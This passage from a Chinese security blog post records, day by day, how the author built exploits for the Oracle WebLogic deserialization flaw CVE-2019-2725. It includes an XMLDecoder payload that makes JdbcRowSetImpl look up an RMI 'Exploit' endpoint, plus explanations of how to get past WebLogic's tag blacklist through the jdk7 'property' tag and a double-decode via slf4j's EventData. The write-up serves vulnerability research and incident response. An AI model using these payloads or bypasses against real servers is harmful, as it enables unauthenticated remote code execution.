<p>不带换行符的在6和7下面都能生成实例。其实这个问题在最早测试 CVE-2018-3191 payload的时候就已经发生过，pyn3rd师傅问我xml payload是怎么生成的，我说用的拼接，直接<code>System.out.println</code>输出的，都带了换行符，我因为当时跑weblogic的jdk是jdk6，所以没有问题，但是 pyn3rd 师傅的环境是 jdk7 的，没测试成功，只觉得是poc写法不同造成的问题，后来师傅自己解决了，这里也没沟通，埋下了一个大坑，导致我后面踩进去了。 </p>
<h3 id="422"><a href="#422" class="headerlink" title="422"></a>422</h3><p>2019年4月22日，pyn3rd 师傅测试 WebLogic 12.1.3没成功，发现是12的版本没有<code>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</code>这个类，所以没办法利用。尝试着构造新的exp，目前的情况是，能够创建类的实例，但是调用不了方法。自然想起<code>com.sun.rowset.JdbcRowSetImpl</code>这个类。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.8.0_131"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">"dataSourceName"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>rmi://localhost:1099/Exploit<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">"autoCommit"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个是CVE-2017-10271的一种触发方法。之前的黑名单提过，<code>void</code>标签后面只能跟<code>index</code>，所以上面这个payload肯定会被黑名单拦截。尝试使用<code>class</code>标签重写上面的payload。</p>
<p>构造的过程中，在跟底层代码的时候，发现 jdk 6和 jdk 7处理标签的方式不同。</p>
<p>jdk 6使用的是<code>com.sun.beans.ObjectHandler</code></p>
<p><img src="D:/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/WebLogic%20RCE(CVE-2019-2725" alt="">/20.png)</p>
<p>能用的有<code>string</code>，<code>class</code>，<code>null</code>，<code>void</code>，<code>array</code>，<code>java</code>，<code>object</code>和一些基本类型标签(如int)。</p>
<p>jdk7 使用的是<code>com.sun.beans.decoder.DocumentHandler</code></p>
<p><img src="D:/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/WebLogic%20RCE(CVE-2019-2725" alt="">/21.png)</p>
<p>可以看到，和jdk6差异不小，例如，jdk 6不支持<code>new</code>，<code>property</code>等标签。</p>
<p>我在用jdk 6 的标签构造的时候，一直没构造成功，直到我看到jdk 7 的源码里面的<code>property</code>，这不就是我想要的么，而且这个标签还不在 WebLogic 的黑名单内。所以重写上面的payload如下</p>
<p><img src="22-1.png" alt=""></p>
<p>可以看到，没有触发黑名单，成功的执行了命令，而且没有依赖 WebLogic 内部的包，10.3.6和12.1.3都可以通用。遗憾的是，这个payload的打不了 jdk 6的，因为 jdk 6 不支持 <code>property</code>标签。期望有大佬能写出6也能用的。</p>
<h3 id="423"><a href="#423" class="headerlink" title="423"></a>423</h3><p>2019年4月23日，在CNVD发出通告，各大安全公司发出漏洞预警之后，之前提过的新url+老payload的这种模式的poc和exp纷纷出炉。不仅是国内，国外也很热闹，很多人表示测试成功，但是都是在无补丁的情况下测试的。Oracle 官网下载的 WebLogic 都是没有安装补丁的，Oracle的补丁是单独收费的，如果安装了 CVE-2017-10271 的补丁，这些poc和exp都是没有办法触发的，绕过不了黑名单。</p>
<p><img src="23.png" alt=""></p>
<h3 id="426"><a href="#426" class="headerlink" title="426"></a>426</h3><p>2019年4月26日，Oracle 官方发布紧急补丁，并为该漏洞分配编号CVE-2019-2725。</p>
<h3 id="427"><a href="#427" class="headerlink" title="427"></a>427</h3><p>2019年4月27日，pyn3rd 师傅说12.1.3版本的exp也有人弄出来了，用的是<code>org.slf4j.ext.EventData</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">EventData</span><span class="params">(String xml)</span> </span>&#123;</span><br><span class="line">    ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(xml.getBytes());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        XMLDecoder decoder = <span class="keyword">new</span> XMLDecoder(bais);</span><br><span class="line">        <span class="keyword">this</span>.eventData = (Map)decoder.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> EventException(<span class="string">"Error decoding "</span> + xml, var4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看下这个类的构造方法，直接将传入的xml交给XMLdecoder处理，太粗暴了…</p>
<p>相当于经过了两次XMLdecode，所以外层用<code>&lt;class&gt;</code>绕过，内层直接标记为纯文本，绕过第一次过滤，第二次 XMLdecode不经过WebLogic 黑名单，直接被JDK解析反序列化执行。</p>
<p><img src="24-1.png" alt=""></p>
<p>这种exp也是最完美的，没有jdk版本限制，不需要外连，可惜的是只能打12.1.3版本。</p>
<h3 id="430"><a href="#430" class="headerlink" title="430"></a>430</h3><p>2019年4月30日，在其他大佬手中看到了这个漏洞的其他利用方式，没有 weblogic和 jdk的版本限制，比上面的几种利用方式都更完善。这种利用方式我之前也看到过，就是Tenable 发的<a href="https://www.youtube.com/watch?v=lePLlC1hFrU&amp;feature=youtu.be" target="_blank" rel="noopener">演示视频</a>，当时没想明白，看了大佬的利用方式之后，才明白自己忽略了什么。构造方式可以参考CVE-2017-17485，我之前构造exp的时候也没有往这方面想，这或许就是黑哥说的积累不够吧。</p>
<p><img src="27.png" alt=""></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>针对这次漏洞，Oracle 也是打破了常规更新，在漏洞预警后不久就发布了补丁，仍然是使用黑名单的方式修复。(吐槽一下，这么修复，这个功能还能用么？)</li>
<li>此次的漏洞事件中，也看到了安全圈的乱象，漏洞都没有经过完全的验证，就直接错误的分析文章和假poc，误导大众。</li>
<li>在这个漏洞应急的过程中，从无到有，从缺到圆，踩了很多坑，也学习到了很多姿势，也看到了自己和大佬的差距。最后感谢漏洞应急过程中几位师傅的交流和指点。</li>
</ul>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><a href="http://www.cnvd.org.cn/webinfo/show/4989" target="_blank" rel="noopener">关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告</a></li>
<li><a href="https://paper.seebug.org/487/" target="_blank" rel="noopener">Weblogic XMLDecoder RCE分析</a></li>
<li><a href="https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html" target="_blank" rel="noopener">Oracle Security Alert Advisory - CVE-2019-2725</a></li>
<li><a href="https://medium.com/@knownseczoomeye/knownsec-404-team-oracle-weblogic-deserialization-rce-vulnerability-0day-alert-90dd9a79ae93" target="_blank" rel="noopener">[KnownSec 404 Team] Oracle WebLogic Deserialization RCE Vulnerability (0day) Alert</a></li>
<li><a href="https://www.youtube.com/watch?v=NtjC7cheNd8&amp;feature=youtu.be" target="_blank" rel="noopener">WebLogic Unauthenticated Remote Code Execution Vulnerability (CVE-2019-2725) with Pocsuite3</a></li>
</ul>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/04/10/Confluence-Unauthorized-RCE-Vulnerability-CVE-2019-3396-Analysis/" rel="next" title="Confluence Unauthorized RCE Vulnerability(CVE-2019-3396) Analysis">
                <i class="fa fa-chevron-left"></i> Confluence Unauthorized RCE Vulnerability(CVE-2019-3396) Analysis
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/07/09/Adobe-ColdFusion-RCE-CVE-2019-7839/" rel="prev" title="Adobe ColdFusion RCE(CVE-2019-7839)">
                Adobe ColdFusion RCE(CVE-2019-7839) <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Badcode</p>
              <p class="site-description motion-element" itemprop="description">学习经历</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">18</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          

          <div class="links-of-author motion-element">
            
          </div>

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#417"><span class="nav-number">1.</span> <span class="nav-text">417</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#418"><span class="nav-number">2.</span> <span class="nav-text">418</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#419"><span class="nav-number">3.</span> <span class="nav-text">419</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#421"><span class="nav-number">4.</span> <span class="nav-text">421</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#422"><span class="nav-number">5.</span> <span class="nav-text">422</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#423"><span class="nav-number">6.</span> <span class="nav-text">423</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#426"><span class="nav-number">7.</span> <span class="nav-text">426</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#427"><span class="nav-number">8.</span> <span class="nav-text">427</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#430"><span class="nav-number">9.</span> <span class="nav-text">430</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">10.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考链接"><span class="nav-number">11.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Badcode</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
